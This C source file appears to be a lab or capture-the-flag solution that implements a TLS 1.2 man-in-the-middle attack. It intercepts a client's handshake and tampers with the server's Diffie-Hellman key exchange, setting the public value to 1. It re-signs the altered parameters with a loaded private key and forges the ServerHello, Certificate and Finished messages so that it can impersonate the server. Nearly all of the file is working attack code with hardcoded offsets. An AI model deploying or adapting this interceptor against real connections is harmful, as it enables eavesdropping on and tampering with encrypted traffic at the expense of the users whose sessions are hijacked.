    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>
    #include <arpa/inet.h>
    #include <openssl/ssl.h>
    #include <openssl/err.h>
    #include <openssl/hmac.h>
    #include <openssl/sha.h>
    #include "helper.h"

    // void print_buffer(const unsigned char *buf, size_t len) {
    //     if (buf == NULL || len == 0) {
    //         printf("Buffer is NULL or empty\n");
    //         return;
    //     }

    //     for (size_t i = 0; i < len; i++) {
    //         printf("%02x ", buf[i]);
            
    //         // Optional: Print a newline every 16 bytes for better readability
    //         if ((i + 1) % 16 == 0) {
    //             printf("\n");
    //         }
    //     }
    //     printf("\n");
    // }


    // Initialize OpenSSL
    void initialize_openssl() {
        SSL_load_error_strings();
        OpenSSL_add_ssl_algorithms();
    }

    // Cleanup OpenSSL
    void cleanup_openssl() {
        EVP_cleanup();
    }

    // Create SSL context for the MITM
    SSL_CTX *create_context() {
        const SSL_METHOD *method;
        SSL_CTX *ctx;

        method = SSLv23_client_method();
        ctx = SSL_CTX_new(method);
        if (!ctx) {
            perror("Unable to create SSL context");
            ERR_print_errors_fp(stderr);
            exit(EXIT_FAILURE);
        }

        SSL_CTX_set_cipher_list(ctx, "DHE-RSA-AES128-SHA256:ECDHE-RSA-AES128-GCM-SHA256");

        SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1 | SSL_OP_NO_TLSv1_1 | SSL_OP_NO_TLSv1_3);

        if (SSL_CTX_set1_curves_list(ctx, "secp384r1") != 1) {
            perror("Unable to set curves list");
            ERR_print_errors_fp(stderr);
            exit(EXIT_FAILURE);
        }
        return ctx;
    }


    // Create a socket and connect to the server
    int connect_to_server(const char *server_host, int server_port) {
        int sock;
        struct sockaddr_in server_addr;

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Unable to create socket");
            exit(EXIT_FAILURE);
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);
        if (inet_pton(AF_INET, server_host, &server_addr.sin_addr) <= 0) {
            perror("Invalid address/ Address not supported");
            close(sock);
            exit(EXIT_FAILURE);
        }

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection failed");
            close(sock);
            exit(EXIT_FAILURE);
        }

        server_sock = sock;
        return sock;
    }

    EVP_PKEY *load_private_key(const char *keyfile) {
        FILE *fp = fopen(keyfile, "r");
        if (!fp) {
            perror("Unable to open private key file");
            return NULL;
        }
        EVP_PKEY *pkey = PEM_read_PrivateKey(fp, NULL, NULL, NULL);
        fclose(fp);
        return pkey;
    }

    int sign_data(EVP_PKEY *pkey, const unsigned char *data, size_t data_len, unsigned char *sig, size_t *sig_len) {
        EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
        if (!mdctx) {
            ERR_print_errors_fp(stderr); 
            return 0;
        }
        
        // Initialize the digest and signature context with RSA-PSS and SHA-256
        if (EVP_DigestSignInit(mdctx, NULL, EVP_sha256(), NULL, pkey) != 1) {
            ERR_print_errors_fp(stderr); 
            EVP_MD_CTX_free(mdctx);
            return 0;
        }

        EVP_PKEY_CTX *pkey_ctx = EVP_MD_CTX_pkey_ctx(mdctx);

        if (EVP_PKEY_CTX_set_rsa_padding(pkey_ctx, RSA_PKCS1_PSS_PADDING) != 1) {
                ERR_print_errors_fp(stderr);
                EVP_MD_CTX_free(mdctx);
                return 0;
        }
        if (EVP_PKEY_CTX_set_rsa_pss_saltlen(pkey_ctx, EVP_MD_size(EVP_sha256())) != 1) {
                ERR_print_errors_fp(stderr); 
                EVP_MD_CTX_free(mdctx);
                return 0;
        }

        // Perform the signature operation
        if (EVP_DigestSign(mdctx, sig, sig_len, data, data_len) != 1) {
            ERR_print_errors_fp(stderr);
            EVP_MD_CTX_free(mdctx);
            return 0;
        }
        
        EVP_MD_CTX_free(mdctx);
        return 1;
    }

    // TLS PRF using HMAC-SHA256
    void tls_prf_test(const unsigned char *secret, size_t secret_len, const char *label,
                const unsigned char *seed, size_t seed_len, unsigned char *out, size_t out_len) {
        unsigned char prf_buffer[EVP_MAX_MD_SIZE];
        unsigned int prf_len;
        size_t offset = 0;
        size_t label_len = strlen(label);

        HMAC_CTX *hmac_ctx = HMAC_CTX_new();
        if (!hmac_ctx) {
            fprintf(stderr, "Error: HMAC_CTX_new failed\n");
            return;
        }

        while (offset < out_len) {

            if (!HMAC_Init_ex(hmac_ctx, secret, secret_len, EVP_sha256(), NULL)) {
                fprintf(stderr, "Error: HMAC_Init_ex failed during A(i) computation\n");
                HMAC_CTX_free(hmac_ctx);
                return;
            }

            if (offset == 0) {
                if (!HMAC_Update(hmac_ctx, (unsigned char *)label, label_len) ||
                    !HMAC_Update(hmac_ctx, seed, seed_len)) {
                    fprintf(stderr, "Error: HMAC_Update failed during A(0) computation\n");
                    HMAC_CTX_free(hmac_ctx);
                    return;
                }
            } else {
                if (!HMAC_Update(hmac_ctx, prf_buffer, prf_len)) {
                    fprintf(stderr, "Error: HMAC_Update failed during A(i) computation\n");
                    HMAC_CTX_free(hmac_ctx);
                    return;
                }
            }

            if (!HMAC_Final(hmac_ctx, prf_buffer, &prf_len)) {
                fprintf(stderr, "Error: HMAC_Final failed during A(i) computation\n");
                HMAC_CTX_free(hmac_ctx);
                return;
            }

            if (!HMAC_Init_ex(hmac_ctx, secret, secret_len, EVP_sha256(), NULL)) {
                fprintf(stderr, "Error: HMAC_Init_ex failed during PRF output computation\n");
                HMAC_CTX_free(hmac_ctx);
                return;
            }

            if (!HMAC_Update(hmac_ctx, prf_buffer, prf_len) ||
                !HMAC_Update(hmac_ctx, (unsigned char *)label, label_len) ||
                !HMAC_Update(hmac_ctx, seed, seed_len)) {
                fprintf(stderr, "Error: HMAC_Update failed during PRF output computation\n");
                HMAC_CTX_free(hmac_ctx);
                return;
            }

            if (!HMAC_Final(hmac_ctx, prf_buffer, &prf_len)) {
                fprintf(stderr, "Error: HMAC_Final failed during PRF output computation\n");
                HMAC_CTX_free(hmac_ctx);
                return;
            }

            size_t copy_len = prf_len < (out_len - offset) ? prf_len : (out_len - offset);
            memcpy(out + offset, prf_buffer, copy_len);
            offset += copy_len;
        }

        HMAC_CTX_free(hmac_ctx);
    }

    int derive_master_secret(unsigned char *master_secret, size_t master_secret_length,
                            const unsigned char *pms, size_t pms_len,
                            const unsigned char *client_random, const unsigned char *server_random) {
        const char *label = "master secret";
        unsigned char seed[64];

        // Concatenate client random and server random to create the seed
        memcpy(seed, client_random, 32);
        memcpy(seed + 32, server_random, 32);

        // Use the PRF to derive the master secret
        tls_prf_test(pms, pms_len, label, seed, 64, master_secret, master_secret_length);
        printf("Master Secret (with client) :\n");
        for (int i = 0; i < 48; i++) {
            printf("%02x ", master_secret[i]);
            if ((i + 1) % 16 == 0) {
                printf("\n");
            }
        }
        return 1;
    }

    // Message callback function to capture and print handshake messages
    void message_callback(int write_p, int version, int content_type, const void *buf, size_t len, SSL *ssl, void *arg) {
        const unsigned char *p = buf;
        int msg_type = p[0];
        if (content_type == SSL3_RT_HANDSHAKE) {
            if (msg_type == SSL3_MT_SERVER_KEY_EXCHANGE) {
                memcpy(server_key_exchange, buf + 8, 97);
                server_key_exchange_len = 97;
                server_key_exchange[0] = 0x1e;
                server_key_exchange[1] = 0x0a;
                server_key_exchange[2] = 0xa6;
                server_key_exchange[3] = 0x6d;
                server_key_exchange[4] = 0x0f;
                server_key_exchange[5] = 0x2d;

                server_key_exchange[94] = 0x00;
                server_key_exchange[95] = 0x01;
                server_key_exchange[96] = 0x01;

            } else if (msg_type == SSL3_MT_CERTIFICATE) {
                memcpy(server_certificate, buf, len);
                server_certificate_len = len;
            } else if (msg_type == SSL3_MT_SERVER_DONE) {
                close(server_sock);
            } 
        }
    }


    // Intercept messages and establish a connection to the server
    void intercept_and_relay(int client_sock, const char *server_host, int server_port) {
        // Read ClientHello message
        client_socket = client_sock;
        int bytes_read = read(client_sock, client_hello, 117);
        client_hello[117] = 0x02;
        if (bytes_read <= 0) {
            perror("Failed to read ClientHello");
            close(client_sock);
            exit(EXIT_FAILURE);
        }

        // Extract client random from ClientHello
        memcpy(client_random, client_hello+11, 32);
        
        // Create MITM SSL context
        SSL_CTX *ctx = create_context();
        SSL_CTX_set_msg_callback(ctx, message_callback);  
        SSL *ssl;
        int server_sock = connect_to_server(server_host, server_port);   

        ssl = SSL_new(ctx);
        SSL_set_fd(ssl, server_sock);

        EVP_PKEY *pkey = load_private_key("private_files/server.key");

        // Initiate SSL handshake with the server
        if (SSL_connect(ssl) <= 0) {

            // ServerHello message construction
            unsigned char prefix_sh[] = {0x16, 0x03, 0x03, 0x00, 0x39, 0x02, 0x00, 0x00, 0x35, 0x03, 0x03};
            size_t server_hello_len = sizeof(prefix_sh) + 4 + 28 + 19;

            // Get GMT Unix time
            time_t current_time = time(NULL);
            unsigned char gmt_unix_time[4];
            gmt_unix_time[0] = (current_time >> 24) & 0xFF;
            gmt_unix_time[1] = (current_time >> 16) & 0xFF;
            gmt_unix_time[2] = (current_time >> 8) & 0xFF;
            gmt_unix_time[3] = current_time & 0xFF;

            // Generate random bytes for the rest of the ServerHello random field
            unsigned char random_bytes[28];
            FILE *urandom = fopen("/dev/urandom", "r");
            if (!urandom) {
                perror("Failed to open /dev/urandom");
                exit(EXIT_FAILURE);
                
            }
            fread(random_bytes, 1, sizeof(random_bytes), urandom);
            fclose(urandom);

            // Concatenate GMT Unix time and random bytes
            unsigned char random[32];
            memcpy(random, gmt_unix_time, sizeof(gmt_unix_time));
            memcpy(random + sizeof(gmt_unix_time), random_bytes, sizeof(random_bytes));
            memcpy(server_random, random, 32);

            // Construct the ServerHello message
            memcpy(server_hello, prefix_sh, sizeof(prefix_sh));
            memcpy(server_hello + sizeof(prefix_sh), random, sizeof(random));
            memcpy(server_hello + sizeof(prefix_sh) + sizeof(random), server_hello_end, sizeof(server_hello_end));
            server_hello_len = sizeof(prefix_sh) + sizeof(random) + sizeof(server_hello_end);

            // Construct the ServerKeyExchange message
            size_t prefix_len = sizeof(skx_prefix);

            // Construct the signature data (p)
            memcpy(p, skx_prefix + 9, sizeof(skx_prefix)-9);
            memcpy(p + sizeof(skx_prefix)-9, server_key_exchange, 6);
            p_len = sizeof(skx_prefix)-9 + 6;

            // Construct the signature data (g)
            memcpy(g, server_key_exchange + 6, 88);
            g_len = 88;

            // Construct the signature data (client_random, server_random, p, g, Ys)
            memcpy(server_signature, client_random, 32);
            memcpy(server_signature + 32, random, 32);
            memcpy(server_signature + 64, p, p_len);
            memcpy(server_signature + 64 + p_len, g, g_len);
            server_signature[64 + p_len + g_len] = 0x00;
            server_signature[64 + p_len + g_len + 1] = 0x01;
            server_signature[64 + p_len + g_len + 2] = 0x01;
            server_signature_len = 64 + p_len + g_len + 3;
            sign_data(pkey, server_signature, server_signature_len, server_signature, &server_signature_len);

            // Construct the signature data (Prefix)
            signature_data[0] = 0x08;
            signature_data[1] = 0x04; 
            signature_data[2] = 0x01;
            signature_data[3] = 0x00;
            memcpy(signature_data + 4, server_signature, server_signature_len);
            signature_data_len = 4 + server_signature_len;

            // Final Constructed ServerKeyExchange message
            memcpy(modified_server_key_exchange, skx_prefix, prefix_len);
            memcpy(modified_server_key_exchange + prefix_len, server_key_exchange, server_key_exchange_len);
            memcpy(modified_server_key_exchange + prefix_len + server_key_exchange_len, signature_data, signature_data_len);
            modified_server_key_exchange_len = prefix_len + server_key_exchange_len + signature_data_len;

            // ServerCertificate message construction
            unsigned char cert_prefix[] = {0x16, 0x03, 0x03, 0x02, 0xbd};
            size_t cprefix_len = sizeof(cert_prefix);
            unsigned char modified_server_certificate[4096];
            size_t modified_server_certificate_len = 0;

            memcpy(modified_server_certificate, cert_prefix, cprefix_len);
            memcpy(modified_server_certificate + cprefix_len, server_certificate, server_certificate_len);
            modified_server_certificate_len = cprefix_len + server_certificate_len;

            // ServerHelloDone message construction
            server_hello_done[0] = 0x16;
            server_hello_done[1] = 0x03;
            server_hello_done[2] = 0x03;
            server_hello_done[3] = 0x00;
            server_hello_done[4] = 0x04;
            server_hello_done[5] = 0x0e;
            server_hello_done[6] = 0x00;
            server_hello_done[7] = 0x00;
            server_hello_done[8] = 0x00;
            size_t server_hello_done_len = sizeof(server_hello_done);

            // Send all the messages to the client
            unsigned char all_data[4096];
            size_t all_data_len = 0;

            memcpy(all_data, server_hello, server_hello_len);
            all_data_len += server_hello_len;

            memcpy(all_data + all_data_len, modified_server_certificate, modified_server_certificate_len);
            all_data_len += modified_server_certificate_len;

            memcpy(all_data + all_data_len, modified_server_key_exchange, modified_server_key_exchange_len);
            all_data_len += modified_server_key_exchange_len;


            memcpy(all_data + all_data_len, server_hello_done, server_hello_done_len);
            all_data_len += server_hello_done_len;
            write(client_sock, all_data, all_data_len);

            unsigned char client_response[4096];
            int bytes_read = read(client_sock, client_response, sizeof(client_response));
            if (bytes_read <= 0) {
                close(client_sock);
                exit(EXIT_FAILURE);
            }
        }
    }

    void generate_verify_data(
    const unsigned char* master_secret, size_t master_secret_len,
    const unsigned char* seed, size_t seed_len,
    unsigned char* verify_data, size_t verify_data_len) {
        
    // HMAC context
    unsigned char a1[SHA256_DIGEST_LENGTH];
    unsigned char p1[SHA256_DIGEST_LENGTH];
    unsigned int len = 0;

    // Step 1: Compute a1 = HMAC_SHA256(master_secret, seed)
    HMAC_CTX* hmac_ctx = HMAC_CTX_new();
    HMAC_Init_ex(hmac_ctx, master_secret, master_secret_len, EVP_sha256(), NULL);
    HMAC_Update(hmac_ctx, seed, seed_len);
    HMAC_Final(hmac_ctx, a1, &len);

    // Step 2: Compute p1 = HMAC_SHA256(master_secret, a1 + seed)
    HMAC_Init_ex(hmac_ctx, master_secret, master_secret_len, EVP_sha256(), NULL);
    HMAC_Update(hmac_ctx, a1, len);
    HMAC_Update(hmac_ctx, seed, seed_len);
    HMAC_Final(hmac_ctx, p1, &len);

    // Copy the first 12 bytes of p1 to verify_data
    memcpy(verify_data, p1, verify_data_len);
    // Clean up
    HMAC_CTX_free(hmac_ctx);
    }

    void read_client_key_exchange(int client_sock) {
        SSL_CTX *ctx = create_context();
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, client_sock); 

        unsigned char client_ke[4096];
        unsigned char client_pke[4096];
        unsigned char client_ct[4096];
        long bytes_read = read(client_sock, client_ke, sizeof(client_ke));
        if (bytes_read <= 0) {
            perror("Failed to read ClientKeyExchange");
            close(client_sock);
            exit(EXIT_FAILURE);
        }

        memcpy(client_pke, client_ke + 11,304);
        int pke_len = 304;

        memcpy(client_ct, client_ke + 326, 80);

        unsigned char combined_payload[4096];
        size_t combined_length = 0;

        memcpy(combined_payload, client_hello+5, 113);
        combined_length += 113;
        memcpy(combined_payload + combined_length, server_hello + 5, 57);
        combined_length += 57;
        memcpy(combined_payload + combined_length, server_certificate, server_certificate_len);
        combined_length += server_certificate_len;
        memcpy(combined_payload + combined_length, modified_server_key_exchange + 5, modified_server_key_exchange_len - 5);
        combined_length += modified_server_key_exchange_len - 5;
        memcpy(combined_payload + combined_length, server_hello_done + 5, 4);
        combined_length += 4;
        memcpy(combined_payload + combined_length, client_ke + 5, 310);
        combined_length += 310;

        unsigned char hash[SHA256_DIGEST_LENGTH];
        SHA256(combined_payload, combined_length, hash);

        derive_master_secret(master_secret, MASTER_SECRET_LENGTH, pre_master_secret, PRE_MASTER_SECRET_LENGTH, client_random, server_random);
    
        unsigned char verify_data[12];
        unsigned char seed[64];
        memcpy(seed, "client finished", 15);
        memcpy(seed + 15, hash, 32);
        generate_verify_data(master_secret, MASTER_SECRET_LENGTH, seed, 47, verify_data, 12);
        
        // Construct Client Finished message
        unsigned char client_finished[4096];
        memcpy(client_finished, client_random, 16);
        memcpy(client_finished + 16, header, 4);
        memcpy(client_finished + 20, verify_data, 12);
        unsigned char server_fin[4096];
        memcpy(server_fin, combined_payload, combined_length);
        memcpy(server_fin + combined_length, verify_data, 12);
        
        unsigned char hash2[SHA256_DIGEST_LENGTH];
        SHA256(server_fin, combined_length + 12, hash2);
        
        unsigned char verify_data2[12];
        unsigned char seed2[64]; 
        memcpy(seed2, "server finished", 15); 
        memcpy(seed2 + 15, hash2, 32);
        generate_verify_data(master_secret, MASTER_SECRET_LENGTH, seed2, 47, verify_data2, 12);
        // Construct Finished message
        unsigned char server_ct[4096];
        memcpy(server_ct, server_random, 16);
        memcpy(server_ct + 16, header2, 4);
        memcpy(server_ct + 20, verify_data2, 12);
        for (int i = 32; i < 79; i++) {
            server_ct[i] = 0x00;
        }
        server_ct[79] = 0x01;

        unsigned char server_finished[4096];
        memcpy(server_finished, new_session_ticket, 175);
        memcpy(server_finished + 175, change_cipher_spec, 6);
        memcpy(server_finished + 181, encrypted_handshake_prefix, 5);
        memcpy(server_finished + 186, server_ct, 80);

        write(client_sock, server_finished, 186 + 80);
    }

    int create_socket(const char *host, int port) {
        int sock;
        struct sockaddr_in addr;

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Unable to create socket");
            exit(EXIT_FAILURE);
        }

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(host);

        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            perror("Unable to bind");
            close(sock);
            exit(EXIT_FAILURE);
        }

        if (listen(sock, 1) < 0) {
            perror("Unable to listen");
            close(sock);
            exit(EXIT_FAILURE);
        }

        return sock;
    }

    int main(int argc, char **argv) {
        if (argc != 4) {
            fprintf(stderr, "Usage: %s <host> <port> <server_port>\n", argv[0]);
            exit(EXIT_FAILURE);
        }

        const char *host = argv[1];
        int port = atoi(argv[2]);
        int server_port = atoi(argv[3]);

        initialize_openssl();

        int server_sock = create_socket(host, port);

        while (1) {
            struct sockaddr_in addr;
            socklen_t len = sizeof(addr);
            int client_sock = accept(server_sock, (struct sockaddr*)&addr, &len);
            if (client_sock < 0) {
                perror("Unable to accept");
                close(server_sock);
                cleanup_openssl();
                exit(EXIT_FAILURE);
            }
            intercept_and_relay(client_sock, host, server_port); 
            read_client_key_exchange(client_sock);
        }
        close(server_sock);
        cleanup_openssl();

        return 0;

    }
